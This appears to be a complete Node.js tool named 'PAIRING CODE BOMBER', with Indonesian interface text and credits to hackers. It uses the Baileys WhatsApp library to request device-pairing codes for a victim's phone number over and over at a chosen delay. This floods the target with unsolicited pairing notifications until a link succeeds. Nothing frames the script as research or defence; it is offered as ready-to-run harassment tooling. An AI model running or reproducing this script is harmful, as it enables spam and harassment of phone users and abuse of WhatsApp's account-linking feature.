process.stdout.write("c");
const figlet = require('figlet');
figlet.text("PAIRING CODE BOMBER", {
  'font': "Slant",
  'horizontalLayout': "default",
  'verticalLayout': "default"
}, (error, result) => {
  if (error) {
    console.log("Terjadi kesalahan:", error);
    return;
  }
  console.log(result);
});

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  makeInMemoryStore
} = require("@whiskeysockets/baileys");
const fs = require('fs');
const pino = require("pino");
const chalk = require("chalk");
const readline = require("readline");
const { Boom } = require("@hapi/boom");
const EventEmitter = require("events");
EventEmitter.defaultMaxListeners = 150;

const promptQuestion = questionText => {
  const rlInterface = readline.createInterface({
    'input': process.stdin,
    'output': process.stdout
  });
  return new Promise(resolve => {
    rlInterface.question(questionText, answer => {
      rlInterface.close();
      resolve(answer);
    });
  });
};

const store = makeInMemoryStore({
  'logger': pino().child({
    'level': "silent",
    'stream': "store"
  })
});

async function startBot() {
  const {
    state: authState,
    saveCreds: saveCredentials
  } = await useMultiFileAuthState("authState");
  
  const socket = makeWASocket({
    'logger': pino({
      'level': "silent"
    }),
    'printQRInTerminal': false,
    'auth': authState,
    'connectTimeoutMs': 60000,
    'defaultQueryTimeoutMs': 0,
    'keepAliveIntervalMs': 10000,
    'emitOwnEvents': true,
    'fireInitQueries': true,
    'generateHighQualityLinkPreview': true,
    'syncFullHistory': true,
    'markOnlineOnConnect': true,
    'browser': ["Ubuntu", 'Chrome', '20.0.04']
  });

  await new Promise(resolve => setTimeout(resolve, 3000));
  
  let isConnected = false;
  let attemptCount = 0;

  console.log(chalk.red(`
                        
                        
                        
                        
                        ⠀⠀⠀⠀⠀⠀⣠⡞⠁⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠈⠹⣦⡀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⣼⠋⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣦⣀⠀⠀⠀⠈⢿⣄⠀⠀⠀⠀⠀
      ⠀⠀⠀⢀⡾⠁⠀⣠⡾⢁⣾⡿⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣆⠹⣦⠀⠀⢻⣆⠀⠀⠀⠀
        ⠀⠀⢀⡾⠁⢀⢰⣿⠃⠾⢋⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⠀⢹⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡌⠻⠆⢿⣧⢀⠀⢻⣆⠀⠀⠀
          ⠀⠀⣾⠁⢠⡆⢸⡟⣠⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣦⡸⣿⠀⣆⠀⢿⡄⠀⠀
            ⠀⢸⡇⠀⣽⡇⢸⣿⠟⢡⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣉⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠙⢿⣿⠀⣿⡀⠘⣿⠀⠀
              ⡀⣿⠁⠀⣿⡇⠘⣡⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣦⡙⠀⣿⡇⠀⢻⡇⠀
                ⢸⡟⠀⡄⢻⣧⣾⡿⢋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣴⣿⠉⡄⢸⣿⠀
                  ⢾⡇⢰⣧⠸⣿⡏⢠⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠀⠓⢶⠶⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣆⠙⣿⡟⢰⡧⠀⣿⠀
                    ⣸⡇⠰⣿⡆⠹⣠⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣶⣿⡏⠀⠠⢺⠢⠀⠀⣿⣷⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠸⠁⣾⡇⠀⣿⠀
                      ⣿⡇⠀⢻⣷⠀⣿⡿⠰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡅⠀⠀⢸⡄⠀⠀⣿⣿⣿⣿⣿⣿⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡆⣰⣿⠁⠀⣿⠀
                        ⢸⣧⠀⡈⢿⣷⣿⠃⣰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣇⠀⢀⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣸⡀⢿⣧⣿⠃⡀⢸⣿⠀
                          ⠀⣿⡀⢷⣄⠹⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⣿⣿⠀⣼⣿⣿⣿⣿⣿⣿⣿⡯⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⢸⡟⢁⣴⠇⣼⡇⠀
                            ⠀⢸⡇⠘⣿⣷⡈⢰⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⣿⣿⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢰⣿⡧⠈⣴⣿⠏⢠⣿⠀⠀
                              ⠀⠀⢿⡄⠘⢿⣿⣦⣿⣯⠘⣆⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⡎⢸⣿⣣⣾⡿⠏⠀⣾⠇⠀⠀
                                ⠀⠀⠈⢷⡀⢦⣌⠛⠿⣿⡀⢿⣆⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢀⣿⡁⣼⡿⠟⣉⣴⠂⣼⠏⠀⠀⠀
                                  ⠀⠀⠀⠈⢷⡈⠻⣿⣶⣤⡁⠸⣿⣆⠡⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢀⣾⡟⠀⣡⣴⣾⡿⠁⣴⠏⠀⠀⠀⠀
                                    ⠀⠀⠀⠀⠈⢿⣄⠈⢙⠿⢿⣷⣼⣿⣦⠹⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⢡⣾⣿⣶⣿⠿⢛⠉⢀⣾⠏⠀⠀⠀⠀⠀
                                      ⠀⠀⠀⠀⠀⠀⠹⣧⡀⠳⣦⣌⣉⣙⠛⠃⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠐⠛⠋⣉⣉⣤⡶⠁⣰⡿⠁
                                        
  ") + chalk.blue("
    
  
  # Thanks To:
  - Allah Swt
  - Lezz DcodeR ( Pengembang Tools Ini )
  - Reda ( Seorang Peretas Yang Ganteng, baik, Dan Tidak Sombong )
  - Trojan TKT
  - Om Adji
  - Matrixman ( Seorang Hacker Yang Selalu Gagal Di Dunia Percintaan, Tetapi Selalu Berhasil Di Dunia Peretasan )
  - Rusdi, Andre,dan Seluruh Teman Jom0knya ( Sangat Menghibur )
  - Primexuu
  - Amir ( Babu Reda & Lezz )
    
  # Sosial Media Pengembang
  - Tiktok: https://tiktok.com/@lezzzdcoder
  - Github: https://github.com/LezzDcodeR
  
  
  
  `));

  let targetNumber = await promptQuestion("Masukan Nomor Target, Awali Dengan Code Negara: ");
  let delayTime = await promptQuestion("Masukan Delay: ");

  while (!isConnected) {
    try {
      targetNumber = targetNumber.replace(/[^0-9]/g, '');
      let pairingCode = await socket.requestPairingCode(targetNumber);
      pairingCode = pairingCode.match(/.{1,4}/g)?.["join"]('-') || pairingCode;
      console.log("Pairing Code: " + pairingCode);
      attemptCount++;
      
      await new Promise(resolve => {
        const timeoutId = setTimeout(() => {
          if (!isConnected) {
            resolve();
          }
        }, delayTime * 1000);

        socket.ev.on("connection.update", update => {
          if (update.connection === "open") {
            isConnected = true;
            clearTimeout(timeoutId);
            console.log("Berhasil terhubung!");
            resolve();
          }
        });
      });
    } catch (error) {
      console.log("Error generating pairing code: " + error);
      console.log("Menunggu 10 detik sebelum mencoba lagi...");
      await new Promise(resolve => setTimeout(resolve, 10000));
    }
  }

  store.bind(socket.ev);
  
  socket.ev.on("connection.update", async update => {
    const {
      connection: status,
      lastDisconnect: disconnect
    } = update;
    
    if (status === "close") {
      const statusCode = new Boom(disconnect?.["error"])?.["output"]?.["statusCode"];
      if (statusCode === DisconnectReason.badSession || 
          statusCode === DisconnectReason.connectionClosed || 
          statusCode === DisconnectReason.connectionLost || 
          statusCode === DisconnectReason.connectionReplaced || 
          statusCode === DisconnectReason.restartRequired || 
          statusCode === DisconnectReason.timedOut) {
        console.log("Koneksi ditutup, mencoba kembali...");
        startBot();
      }
    } else if (status === 'open') {
      // Connection is open
    }
  });

  socket.ev.on("creds.update", saveCredentials);
}

startBot();

const file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log("Update " + __filename);
  delete require.cache[file];
  require(file);
});
